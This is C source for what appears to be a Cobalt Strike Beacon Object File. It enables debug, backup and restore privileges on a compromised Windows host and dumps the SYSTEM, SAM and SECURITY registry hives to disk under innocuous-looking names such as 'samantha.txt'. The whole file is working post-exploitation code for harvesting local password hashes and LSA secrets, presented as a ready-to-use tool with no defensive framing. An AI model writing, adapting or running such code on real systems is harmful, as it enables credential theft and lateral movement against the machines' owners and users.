#include "common.h"


void EnableDebugPriv( LPCSTR priv ) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;


	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] OpenProcessToken failed, Error = %d .\n" , KERNEL32$GetLastError() );
		return;
	}

	if (ADVAPI32$LookupPrivilegeValueA( NULL, priv, &luid ) == 0 )
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] LookupPrivilegeValue() failed, Error = %d .\n", KERNEL32$GetLastError() );
		KERNEL32$CloseHandle( hToken );
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!ADVAPI32$AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL ))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] AdjustTokenPrivileges() failed, Error = %u\n", KERNEL32$GetLastError() );
		return;
	}

	KERNEL32$CloseHandle( hToken );
}

void ExportRegKey(LPCSTR subkey, LPCSTR outFile)
{
	HKEY hSubKey;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
    if(ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,subkey,REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS,&hSubKey)==ERROR_SUCCESS)
    {
        if (ADVAPI32$RegSaveKeyA(hSubKey, outFile, lpSecurityAttributes)==ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_OUTPUT,"[*] Exported HKLM\\%s at %s\n", subkey, outFile);
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR,"[*] RegSaveKey failed.");
		}
		
        ADVAPI32$RegCloseKey(hSubKey);
    }
	else
	{
		BeaconPrintf(CALLBACK_ERROR,"[*] Could not open key %s",subkey);
	}
}

void go(char * args, int alen)
{
	datap parser;

	char buffer_1[MAX_PATH] = "";
	char *lpStr1;
	lpStr1 = buffer_1;
	
	char buffer_sam[ ] = "samantha.txt";
	char *lpStrsam;
	lpStrsam = buffer_sam;

	char buffer_sys[ ] = "systemic.txt";
	char *lpStrsys;
	lpStrsys = buffer_sys;

	char buffer_sec[ ] = "security.txt";
	char *lpStrsec;
	lpStrsec = buffer_sec;

	if (!BeaconIsAdmin()){
		BeaconPrintf(CALLBACK_ERROR, "Admin privileges required to use this module!");
		return;
	}
	
	BeaconDataParse(&parser, args, alen); // Parsing arguments from cna
	char * dir;
	dir = BeaconDataExtract(&parser, NULL);

	//Enabling required privileges for reg operations
	EnableDebugPriv(SE_DEBUG_NAME);
	EnableDebugPriv(SE_RESTORE_NAME);
	EnableDebugPriv(SE_BACKUP_NAME);

	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsys);
	ExportRegKey("SYSTEM",lpStr1); //exporting SYSTEM

	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsam);
	ExportRegKey("SAM",lpStr1); //exporting SAM

	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsec);
	ExportRegKey("SECURITY",lpStr1); //exporting SECURITY
};